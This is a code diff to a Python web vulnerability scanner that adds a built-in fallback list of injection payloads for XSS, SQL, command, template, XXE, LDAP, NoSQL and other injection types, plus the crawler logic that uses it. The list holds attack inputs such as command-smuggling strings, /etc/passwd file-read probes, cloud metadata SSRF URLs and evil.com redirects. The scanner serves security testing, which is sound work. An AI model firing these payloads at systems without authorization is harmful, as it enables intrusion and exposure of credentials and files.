@@ -1569,7 +1569,112 @@ class ParameterAnalyzer:
 
 class WordlistMapper:
     """Map vulnerabilities to appropriate wordlists"""
-    
+
+    # Built-in fallback payloads — used when no external wordlist files are found.
+    # Kept intentionally minimal: enough to detect the most common patterns without
+    # replacing a proper wordlist setup.
+    INTERNAL_PAYLOADS = {
+        'xss': [
+            '<script>alert(1)</script>',
+            '<img src=x onerror=alert(1)>',
+            '<svg onload=alert(1)>',
+            '"><script>alert(1)</script>',
+            "' onfocus=alert(1) autofocus='",
+            '<ScRiPt>alert(1)</sCrIpT>',
+            '"><img src=x onerror=alert(1)>',
+            '<details open ontoggle=alert(1)>',
+            '{{constructor.constructor("alert(1)")()}}',
+        ],
+        'sqli': [
+            "'",
+            "''",
+            '"',
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "' OR 1=1#",
+            "1' ORDER BY 1--",
+            "1' ORDER BY 10--",
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--",
+            "1' AND SLEEP(5)--",
+            "'; WAITFOR DELAY '0:0:5'--",
+            "admin'--",
+        ],
+        'lfi': [
+            '../../../etc/passwd',
+            '....//....//....//etc/passwd',
+            '../../../etc/passwd%00',
+            '..%2f..%2f..%2fetc/passwd',
+            '/etc/passwd',
+            'file:///etc/passwd',
+            '..\\..\\..\\windows\\win.ini',
+        ],
+        'rce': [
+            '; echo xrce$(expr 31337 + 7919)xrce',
+            '| echo xrce$(expr 31337 + 7919)xrce',
+            '`echo xrce$(expr 31337 + 7919)xrce`',
+            '; id',
+            '| id',
+            '$(id)',
+            '; sleep 5',
+            '& whoami',
+        ],
+        'ssti': [
+            '{{49163*49163}}',
+            '${49163*49163}',
+            '<%= 49163*49163 %>',
+            '{{7*7}}',
+            '${7*7}',
+            '#{7*7}',
+            '{{config}}',
+            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
+        ],
+        'xxe': [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+        ],
+        'ldapi': [
+            '*',
+            '*)(&',
+            '*)(uid=*))(|(uid=*',
+            'admin*',
+        ],
+        'open_redirect': [
+            '//evil.com',
+            'https://evil.com',
+            '//evil.com/%2f..',
+            '/\\evil.com',
+        ],
+        'crlf': [
+            '%0d%0aSet-Cookie:crlf=injected',
+            '%0ASet-Cookie:test=crlf',
+            '%0d%0aLocation:http://evil.com',
+        ],
+        'xpath': [
+            "' or '1'='1",
+            "' or 1=1 or ''='",
+            "test'",
+        ],
+        'ssrf': [
+            'http://127.0.0.1/',
+            'http://localhost/',
+            'http://169.254.169.254/latest/meta-data/',
+            'http://metadata.google.internal/computeMetadata/v1/',
+            'file:///etc/passwd',
+        ],
+        'nosqli': [
+            '{"$gt":""}',
+            '{"$ne":""}',
+            '{"$regex":".*"}',
+            "' || '1'=='1",
+            '[$ne]=1',
+        ],
+    }
+
+    def get_internal_payloads(self, vuln_type):
+        """Return built-in fallback payloads for a vulnerability type."""
+        return self.INTERNAL_PAYLOADS.get(vuln_type.lower(), [])
+
     def __init__(self, base_paths=None):
         self.base_paths = base_paths or {
             'fuzzdb': '/usr/share/wordlists/fuzzdb',
@@ -3227,9 +3332,17 @@ class SmartCrawler:
                     print(f"    ❌ Error reading wordlist {wordlist['path']}: {e}")
                 continue
         
+        # Fallback: use built-in payloads if no wordlist files were found
+        if not all_payloads:
+            internal = self.wordlist_mapper.get_internal_payloads(vuln_type)
+            if internal:
+                all_payloads = list(internal)
+                if self.verbose:
+                    print(f"    📦 Using {len(all_payloads)} built-in fallback payloads for {vuln_type}")
+
         # Sort and unique (sort | uniq)
         unique_payloads = sorted(list(set(all_payloads)))
-        
+
         if self.verbose:
             print(f"    📊 Total unique payloads: {len(unique_payloads)} (from {len(all_payloads)} total)")
         
